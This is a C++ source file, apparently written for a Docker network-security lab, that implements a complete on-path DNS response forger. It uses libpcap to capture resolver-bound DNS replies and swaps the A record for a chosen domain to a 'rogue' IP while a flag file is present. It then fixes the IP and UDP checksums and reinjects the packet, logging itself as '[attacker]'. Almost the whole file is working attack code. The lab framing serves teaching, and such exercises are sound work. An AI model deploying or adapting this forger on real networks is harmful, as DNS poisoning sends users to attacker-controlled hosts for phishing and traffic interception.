/*
 * dns_interceptor.cpp — Phase 2 on-path DNS response forger.
 *
 * Lab-only interceptor for the assigned Docker network-security exercise.
 * The core-router diversion route sends packets addressed to the resolver
 * (172.16.2.10) through this container. This program explicitly relays
 * captured DNS responses to the resolver's Ethernet MAC.
 *
 * Build: g++ -O2 -std=c++17 -Wall -o dns_interceptor dns_interceptor.cpp -lpcap
 * Usage: RESOLVER_MAC="aa:bb:cc:dd:ee:ff" ./dns_interceptor eth0
 * Optional environment variables:
 *   TARGET_NAME — default "example.com"
 *   ROGUE_IP    — default "172.16.1.30"
 *
 * Create /tmp/forge.on to enable the lab's DNS A-record substitution for
 * TARGET_NAME. Remove it to relay packets without changing DNS records.
 */

#include <array>
#include <cctype>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <optional>
#include <string>

#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <unistd.h>

#include <pcap.h>

namespace {

constexpr int ETH_HDR_LEN = 14;
constexpr const char *FORGE_FLAG_PATH = "/tmp/forge.on";
constexpr const char *RESOLVER_IP = "172.16.2.10";
constexpr size_t MAX_PACKET_SIZE = 2048;

using MacAddr = std::array<uint8_t, 6>;

#pragma pack(push, 1)
struct EthHdr {
    uint8_t dst[6];
    uint8_t src[6];
    uint16_t ethertype;
};
struct IpHdr {
    uint8_t ver_ihl;
    uint8_t tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t ttl;
    uint8_t proto;
    uint16_t checksum;
    uint32_t src;
    uint32_t dst;
};
struct UdpHdr { uint16_t sport, dport, len, checksum; };
struct DnsHdr { uint16_t id, flags, qdcount, ancount, nscount, arcount; };
#pragma pack(pop)

MacAddr g_own_mac{};
MacAddr g_resolver_mac{};
std::string g_target_name = "example.com";
uint32_t g_rogue_ip_net = 0; // network byte order
pcap_t *g_pcap = nullptr;

std::optional<MacAddr> parse_mac(const std::string &s) {
    unsigned int b[6];
    if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x",
               &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6) {
        return std::nullopt;
    }
    MacAddr out{};
    for (int i = 0; i < 6; i++) {
        if (b[i] > 255) return std::nullopt;
        out[i] = static_cast<uint8_t>(b[i]);
    }
    return out;
}

std::optional<MacAddr> get_own_mac(const std::string &iface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return std::nullopt;
    struct ifreq ifr{};
    std::strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        close(fd);
        return std::nullopt;
    }
    MacAddr out{};
    std::memcpy(out.data(), ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
    return out;
}

// Generic Internet checksum (RFC 1071) over a raw byte buffer, treating
// every 16-bit chunk as network-order (high byte first) regardless of
// host endianness, with the final result also returned in network order
// (i.e. store it directly, no htons needed at the call site).
uint16_t checksum16(const void *buf, size_t len) {
    uint32_t sum = 0;
    const auto *p = static_cast<const uint8_t *>(buf);
    while (len >= 2) {
        sum += (static_cast<uint16_t>(p[0]) << 8) | p[1];
        p += 2;
        len -= 2;
    }
    if (len == 1) sum += static_cast<uint16_t>(p[0]) << 8;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    uint16_t result = static_cast<uint16_t>(~sum);
    return result == 0 ? 0xFFFF : result;
}

uint16_t ip_checksum(const IpHdr &ip) {
    IpHdr tmp = ip;
    tmp.checksum = 0;
    return checksum16(&tmp, sizeof(tmp));
}

// Internet checksum over the IPv4 pseudo-header, UDP header, and UDP payload.
uint16_t udp_checksum(const IpHdr &ip, const UdpHdr &udp,
                      const uint8_t *payload, size_t paylen) {
    struct Pseudo {
        uint32_t src, dst;
        uint8_t zero, proto;
        uint16_t udplen;
    } __attribute__((packed)) pseudo{ip.src, ip.dst, 0, 17, udp.len};

    uint32_t sum = 0;
    auto add_bytes = [&sum](const void *buf, size_t len) {
        const auto *p = static_cast<const uint8_t *>(buf);
        while (len >= 2) {
            sum += (static_cast<uint16_t>(p[0]) << 8) | p[1];
            p += 2;
            len -= 2;
        }
        if (len == 1) sum += static_cast<uint16_t>(p[0]) << 8;
    };

    add_bytes(&pseudo, sizeof(pseudo));
    UdpHdr tmp = udp;
    tmp.checksum = 0;
    add_bytes(&tmp, sizeof(tmp));
    add_bytes(payload, paylen);

    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    uint16_t result = static_cast<uint16_t>(~sum);
    return result == 0 ? 0xFFFF : result;
}

// Return the number of bytes consumed by a DNS name at offset, or -1.
int dns_name_len(const uint8_t *buf, int offset, int buflen) {
    const int start = offset;
    while (offset < buflen) {
        uint8_t b = buf[offset];
        if ((b & 0xC0) == 0xC0) {
            if (offset + 2 > buflen) return -1;
            return (offset - start) + 2;
        }
        if (b == 0) return (offset - start) + 1;
        if ((b & 0xC0) == 0) {
            if (offset + 1 + b > buflen) return -1;
            offset += 1 + b;
        } else {
            return -1;
        }
    }
    return -1;
}

// Decode the uncompressed question QNAME into lowercase dotted notation.
int decode_qname(const uint8_t *buf, int offset, int buflen, std::string &out) {
    const int start = offset;
    out.clear();
    while (offset < buflen) {
        uint8_t b = buf[offset];
        if (b == 0) {
            ++offset;
            break;
        }
        if ((b & 0xC0) == 0xC0) return -1;
        if ((b & 0xC0) != 0 || offset + 1 + b > buflen) return -1;
        if (!out.empty()) out += '.';
        for (int i = 0; i < b; i++) {
            out += static_cast<char>(std::tolower(buf[offset + 1 + i]));
        }
        offset += 1 + b;
    }
    return offset - start;
}

bool forging_is_on() {
    struct stat st{};
    return stat(FORGE_FLAG_PATH, &st) == 0;
}

void handle_packet(u_char *, const struct pcap_pkthdr *h, const u_char *bytes) {
    const size_t min_len = ETH_HDR_LEN + sizeof(IpHdr) + sizeof(UdpHdr) + sizeof(DnsHdr);
    if (h->caplen < min_len || h->caplen > MAX_PACKET_SIZE) {
        fprintf(stderr, "[skip] invalid captured length=%u\n", h->caplen);
        return;
    }

    uint8_t pkt[MAX_PACKET_SIZE];
    std::memcpy(pkt, bytes, h->caplen);
    const int caplen = static_cast<int>(h->caplen);

    auto *eth = reinterpret_cast<EthHdr *>(pkt);
    if (ntohs(eth->ethertype) != 0x0800) return;

    auto *ip = reinterpret_cast<IpHdr *>(pkt + ETH_HDR_LEN);
    const int ihl = (ip->ver_ihl & 0x0F) * 4;
    if ((ip->ver_ihl >> 4) != 4 || ihl < static_cast<int>(sizeof(IpHdr)) ||
        ETH_HDR_LEN + ihl + static_cast<int>(sizeof(UdpHdr) + sizeof(DnsHdr)) > caplen) {
        fprintf(stderr, "[skip] invalid IPv4 header length=%d caplen=%d\n", ihl, caplen);
        return;
    }
    if (ip->proto != 17) return;
    // Fragmented IPv4 packets cannot safely be parsed as complete UDP/DNS.
    if ((ntohs(ip->frag_off) & 0x3FFF) != 0) {
        fprintf(stderr, "[skip] fragmented IPv4 packet\n");
        return;
    }

    const int ip_total_len = ntohs(ip->tot_len);
    if (ip_total_len < ihl + static_cast<int>(sizeof(UdpHdr)) ||
        ETH_HDR_LEN + ip_total_len > caplen) {
        fprintf(stderr, "[skip] inconsistent IPv4 total length=%d caplen=%d\n",
                ip_total_len, caplen);
        return;
    }

    auto *udp = reinterpret_cast<UdpHdr *>(pkt + ETH_HDR_LEN + ihl);
    uint8_t *dns_start = pkt + ETH_HDR_LEN + ihl + sizeof(UdpHdr);
    const int udp_declared_len = ntohs(udp->len);
    const int captured_avail = ip_total_len - ihl - static_cast<int>(sizeof(UdpHdr));
    if (udp_declared_len < static_cast<int>(sizeof(UdpHdr)) ||
        udp_declared_len > ip_total_len - ihl ||
        udp_declared_len - static_cast<int>(sizeof(UdpHdr)) > captured_avail) {
        fprintf(stderr, "[skip] inconsistent UDP length=%d IP payload=%d\n",
                udp_declared_len, ip_total_len - ihl);
        return;
    }
    const int dns_len = udp_declared_len - static_cast<int>(sizeof(UdpHdr));
    if (dns_len < static_cast<int>(sizeof(DnsHdr))) return;

    auto *dns = reinterpret_cast<DnsHdr *>(dns_start);
    const uint16_t flags = ntohs(dns->flags);
    const bool qr = ((flags >> 15) & 1) != 0;
    const int ancount = ntohs(dns->ancount);
    const int qdcount = ntohs(dns->qdcount);

    char src_ip[INET_ADDRSTRLEN]{};
    char dst_ip[INET_ADDRSTRLEN]{};
    inet_ntop(AF_INET, &ip->src, src_ip, sizeof(src_ip));
    inet_ntop(AF_INET, &ip->dst, dst_ip, sizeof(dst_ip));
    fprintf(stderr,
            "[capture] %s:%u -> %s:%u dns_id=%u qr=%d qd=%d an=%d bytes=%d\n",
            src_ip, ntohs(udp->sport), dst_ip, ntohs(udp->dport),
            ntohs(dns->id), qr, qdcount, ancount, caplen);
    fflush(stderr);

    auto send_it = [&]() {
        std::memcpy(eth->dst, g_resolver_mac.data(), 6);
        std::memcpy(eth->src, g_own_mac.data(), 6);
        // Recompute BOTH checksums from scratch. Captured packets that
        // transited a veth pair (core-router's real IP forwarding, in
        // this topology) can carry an incomplete "offload placeholder"
        // checksum at EITHER layer -- not just UDP -- so both need to
        // be rebuilt, not just the one we verified failing earlier.
        ip->checksum = ip_checksum(*ip);
        udp->checksum = udp_checksum(*ip, *udp, dns_start, dns_len);

        const int rc = pcap_inject(g_pcap, pkt, caplen);
        fprintf(stderr,
                "[relay] dns_id=%u src_port=%u dst_port=%u bytes=%d inject_rc=%d error=%s\n",
                ntohs(dns->id), ntohs(udp->sport), ntohs(udp->dport), caplen,
                rc, rc < 0 ? pcap_geterr(g_pcap) : "none");
        fflush(stderr);
    };

    if (!qr || qdcount < 1) {
        send_it();
        return;
    }

    int off = sizeof(DnsHdr);
    std::string qname;
    const int namelen = decode_qname(dns_start, off, dns_len, qname);
    bool is_target = false;
    if (namelen > 0) {
        off += namelen;
        if (off + 4 <= dns_len) {
            const int qtype = (dns_start[off] << 8) | dns_start[off + 1];
            off += 4; // QTYPE + QCLASS
            if (qtype == 1 && qname == g_target_name) is_target = true;
        }
    }

    if (is_target && ancount >= 1 && forging_is_on()) {
        int aoff = off;
        bool changed = false;
        for (int i = 0; i < ancount && aoff < dns_len; i++) {
            const int nlen = dns_name_len(dns_start, aoff, dns_len);
            if (nlen < 0) break;
            const int rhdr = aoff + nlen;
            if (rhdr + 10 > dns_len) break;
            const uint16_t rtype = (dns_start[rhdr] << 8) | dns_start[rhdr + 1];
            const uint16_t rclass = (dns_start[rhdr + 2] << 8) | dns_start[rhdr + 3];
            const uint16_t rdlen = (dns_start[rhdr + 8] << 8) | dns_start[rhdr + 9];
            const int rdata_off = rhdr + 10;
            if (rdata_off + rdlen > dns_len) break;
            if (rtype == 1 && rclass == 1 && rdlen == 4) {
                char old_ip[INET_ADDRSTRLEN]{};
                inet_ntop(AF_INET, dns_start + rdata_off, old_ip, sizeof(old_ip));
                std::memcpy(dns_start + rdata_off, &g_rogue_ip_net, 4);
                fprintf(stderr, "[forge] qname=%s old_ip=%s new_ip=%s\n",
                        qname.c_str(), old_ip,
                        inet_ntoa(*reinterpret_cast<struct in_addr *>(&g_rogue_ip_net)));
                fflush(stderr);
                changed = true;
                break;
            }
            aoff = rdata_off + rdlen;
        }
        if (!changed) {
            fprintf(stderr, "[forge] target response had no suitable A record\n");
            fflush(stderr);
        }
    }

    send_it();
}

} // namespace

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "usage: %s <iface>\n", argv[0]);
        return 1;
    }
    const std::string iface = argv[1];

    const char *mac_env = getenv("RESOLVER_MAC");
    if (!mac_env) {
        fprintf(stderr, "RESOLVER_MAC env var missing (expected aa:bb:cc:dd:ee:ff)\n");
        return 1;
    }
    auto resolver_mac = parse_mac(mac_env);
    if (!resolver_mac) {
        fprintf(stderr, "RESOLVER_MAC invalid: %s\n", mac_env);
        return 1;
    }
    g_resolver_mac = *resolver_mac;

    auto own_mac = get_own_mac(iface);
    if (!own_mac) {
        fprintf(stderr, "could not read MAC of %s\n", iface.c_str());
        return 1;
    }
    g_own_mac = *own_mac;

    if (const char *target = getenv("TARGET_NAME")) g_target_name = target;
    for (char &c : g_target_name) c = static_cast<char>(std::tolower(static_cast<unsigned char>(c)));
    while (!g_target_name.empty() && g_target_name.back() == '.') g_target_name.pop_back();

    const char *rogue = getenv("ROGUE_IP");
    if (!rogue) rogue = "172.16.1.30";
    struct in_addr a{};
    if (inet_aton(rogue, &a) == 0) {
        fprintf(stderr, "invalid ROGUE_IP %s\n", rogue);
        return 1;
    }
    g_rogue_ip_net = a.s_addr;

    char errbuf[PCAP_ERRBUF_SIZE]{};
    g_pcap = pcap_open_live(iface.c_str(), 65535, 1, 100, errbuf);
    if (!g_pcap) {
        fprintf(stderr, "pcap_open_live(%s): %s\n", iface.c_str(), errbuf);
        return 1;
    }

    struct bpf_program fp{};
    const char *filter = "udp and src port 53 and dst host 172.16.2.10";
    if (pcap_compile(g_pcap, &fp, filter, 1, PCAP_NETMASK_UNKNOWN) < 0) {
        fprintf(stderr, "pcap_compile failed: %s\n", pcap_geterr(g_pcap));
        pcap_close(g_pcap);
        return 1;
    }
    if (pcap_setfilter(g_pcap, &fp) < 0) {
        fprintf(stderr, "pcap_setfilter failed: %s\n", pcap_geterr(g_pcap));
        pcap_freecode(&fp);
        pcap_close(g_pcap);
        return 1;
    }
    pcap_freecode(&fp);

    // Intentionally do not call pcap_setdirection().
    // libpcap defaults to PCAP_D_INOUT; this avoids direction-filtering
    // differences between capture backends while diagnosing packet visibility.

    fprintf(stderr, "[attacker] up on %s, target=%s, rogue=%s, forging=%s, resolver_mac=%s\n",
            iface.c_str(), g_target_name.c_str(), rogue,
            forging_is_on() ? "ON" : "OFF", mac_env);
    fflush(stderr);

    const int loop_rc = pcap_loop(g_pcap, -1, handle_packet, nullptr);
    if (loop_rc == PCAP_ERROR) {
        fprintf(stderr, "pcap_loop failed: %s\n", pcap_geterr(g_pcap));
    }
    pcap_close(g_pcap);
    return loop_rc == PCAP_ERROR ? 1 : 0;
}
